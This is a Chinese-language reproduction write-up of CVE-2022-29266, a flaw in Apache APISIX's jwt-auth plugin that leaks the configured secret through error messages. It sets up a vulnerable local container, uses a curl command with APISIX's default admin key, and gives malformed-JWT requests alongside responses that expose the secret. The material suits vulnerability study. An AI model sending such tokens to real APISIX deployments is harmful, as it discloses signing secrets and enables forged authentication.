# CVE-2022-29266 （Apache APISIX 信息泄露漏洞） 👋

## 概述

在2.13.1版本之前的APache APISIX中，攻击者可以通过向受jwt-auth插件保护的路由发送错误的JSON Web Token，通过错误信息响应获得插件配置的敏感信息。依赖库lua-resty-jwt中的错误逻辑允许向需要HS256 Token的端点发送RS256 Token，并在错误响应中包含原始密钥值。

关键点：

- 启用jwt-auth插件
- 错误的token信息造成报错显示错误信息
- 需要发送错误的RS256格式的token

1. 

## 复现分析

从apisix-docker拉取镜像
```https://github.com/apache/apisix-docker```

进入到xxx/apisix-docker/example目录

修改docker-compose.yml apisix部分的版本低于2.13.1 ，此处修改为2.10.5-alpine

```
apisix:
    image: apache/apisix:2.10.5-alpine
    restart: always
    volumes:
      - ./apisix_log:/usr/local/apisix/logs
      - ./apisix_conf/config.yaml:/usr/local/apisix/conf/config.yaml:ro
    depends_on:
      - etcd
    ##network_mode: host
    ports:
      - "9080:9080/tcp"
      - "9091:9091/tcp"
      - "9443:9443/tcp"
      - "9092:9092/tcp"
    networks:
      apisix:
```

命令sudo docker-compose up -d启动镜像

注意到由于要启用jwt-auth插件，由于没有使用过，所以点进配置的时候有点懵，直接看官方操作文档（https://apisix.apache.org/zh/docs/apisix/plugins/jwt-auth/）

官方手册中说明：“`jwt-auth` 是一个认证插件，它需要与 `consumer` 一起配合才能工作。” 那就需要配置consumer，继续查看手册发现以下配置代码，直接使用curl在9080端口上创建一个consumer，并配置了jwt-auth的key和secret。

```
curl http://127.0.0.1:9080/apisix/admin/consumers -H 'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
{
    "username": "jack",
    "plugins": {
        "jwt-auth": {
            "key": "user-key",
            "secret": "my-secret-key"
        }
    }
}'
```

查看官方修改的commit发现（以下代码为官方commit修复代码）

1、当使用GET请求带上jwt参数的时候如果出错会触发jwt-auth的错误信息

2、当在headers头中填写错误的Authorization头的时候也会触发jwt-auth的错误信息

```
GET /hello?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTU2Mzg3MDUwMX0.pPNVvh-TQsdDzorRwa-uuiLYiEBODscp9wv0cwD6c68
--- error_code: 401
--- response_body
{"message":"'exp' claim expired at Tue, 23 Jul 2019 08:28:21 GMT"}
{"message":"JWT token verify failed"}
--- error_log
JWT token verify failed: 'exp' claim expired at Tue, 23 Jul 2019 08:28:21 GMT



@@ -274,7 +278,9 @@ GET /hello
Authorization: bearer invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImV4cCI6MTg3OTMxODU0MX0.fNtFJnNmJgzbiYmGB0Yjvm-l6A6M4jRV1l4mnVFSYjs
--- error_code: 401
--- response_body
{"message":"invalid header: invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}
{"message":"JWT token invalid"}
--- error_log
JWT token invalid: invalid header: invalid-eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

到这已经能直接复现了，两种方式可以选择一种即可验证。

回顾最开始提到的注意中“需要发送错误的RS256格式的token”问题，为什么不直接提供随便字符？而是需要提供一个错误的RS256格式的token，官方其实修改了两个地方：

1、修复了触发抛出jwt-auth错误信息的逻辑

2、修复了jwt_obj.valid和jwt_obj.verified抛出错误信息的异常

通过看第2点的名字也应该能知道，valid是判断token格式是否合法，verified才是验证，然而两者中只有verified时出错了才会返回key，而触发valid不会触发，以下是两种不同情况触发的返回包：

1、jwt合法但是有错误

```
HTTP/1.1 401 Unauthorized
Date: Fri, 22 Apr 2022 15:41:03 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.5
Content-Length: 75

{"message":"Decode secret is not a valid cert\/public key: my-secret-key"}

```

2、jwt格式不合法

```
HTTP/1.1 401 Unauthorized
Date: Fri, 22 Apr 2022 15:40:47 GMT
Content-Type: text/plain; charset=utf-8
Connection: close
Server: APISIX/2.10.5
Content-Length: 33

{"message":"invalid jwt string"}
```

## 回顾

漏洞本身不复杂

复现的时候多看官网文档，一开始没看到consumer添加实在9080端口，一直在9000上搞了半天.....

## 参考

https://www.openwall.com/lists/oss-security/2022/04/20/1

https://github.com/apache/apisix/pull/6846/files#diff-9b9604832706062cf84d2e9b7a13754c0f21a9a0b34cf271a4eb059f4bffbdaaL436